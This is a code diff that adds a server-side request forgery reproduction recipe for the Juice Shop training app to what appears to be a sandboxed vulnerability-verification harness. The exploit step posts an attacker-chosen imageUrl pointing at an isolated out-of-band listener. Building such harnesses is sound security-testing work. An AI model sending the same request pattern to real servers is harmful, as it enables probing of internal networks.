@@ -431,6 +431,56 @@ function ftpPoisonNullByteRecipe(config: JuiceShopConfig): ReproductionRecipe {
   };
 }
 
+const PROFILE_IMAGE_URL_UPLOAD_PATH = "/profile/image/url";
+
+/**
+ * Out-of-band SSRF on `POST /profile/image/url` (routes/profileImageUrlUpload.ts). When an
+ * authenticated user submits `imageUrl`, the server calls `fetch(url)` directly without host
+ * filtering and redirects to `/profile` (`302`).
+ *
+ * The orchestrator boots an isolated, internet-blocked OOB listener peer sandbox link-joined to
+ * the target (`oobListener: { port: 8080 }`) and exposes its private link address as `{{oobUrl}}`.
+ * The fixture registers a fresh user (`{{canary}}`), setup logs in and captures `userToken`, the
+ * negative control hits `GET /profile` with that token (no `imageUrl` submitted, so the listener
+ * sees no callback), and the exploit posts `imageUrl: "{{oobUrl}}/{{canary}}.jpg"` with
+ * `Cookie: token={{userToken}}`. The run reproduces only when the listener records a callback
+ * carrying this run's `{{canary}}`.
+ */
+function ssrfProfileImageRecipe(config: JuiceShopConfig): ReproductionRecipe {
+  return {
+    id: "juice-shop-ssrf-profile-image",
+    title: "Server-side request forgery in profile image URL upload",
+    keywords: ["ssrf", "server-side request forgery", "imageUrl", PROFILE_IMAGE_URL_UPLOAD_PATH],
+    fixture: registrationFixture(config),
+    oobListener: { port: 8080 },
+    setup: [
+      {
+        request: {
+          method: "POST",
+          path: LOGIN_PATH,
+          body: { email: CANARY_PLACEHOLDER, password: FIXTURE_PASSWORD },
+        },
+        capture: {
+          userToken: extractAuthToken,
+        },
+      },
+    ],
+    negativeControl: {
+      method: "GET",
+      path: "/profile",
+      headers: { Cookie: "token={{userToken}}" },
+    },
+    negativeControlAcceptedStatuses: [302],
+    exploit: {
+      method: "POST",
+      path: PROFILE_IMAGE_URL_UPLOAD_PATH,
+      headers: { Cookie: "token={{userToken}}" },
+      body: { imageUrl: `{{oobUrl}}/${CANARY_PLACEHOLDER}.jpg` },
+    },
+    oracleCheck: () => false,
+  };
+}
+
 /**
  * Juice Shop's search view renders the `q` route parameter into the page with
  * `bypassSecurityTrustHtml` and an `[innerHTML]` binding (the localXssChallenge), so a payload in
@@ -481,6 +531,7 @@ export const getRecipesForTarget: GetRecipesForTargetFn = (target) => {
       loginBypassRecipe(target.config),
       idorBasketRecipe(target.config),
       ftpPoisonNullByteRecipe(target.config),
+      ssrfProfileImageRecipe(target.config),
       domXssSearchRecipe(),
     ];
   }
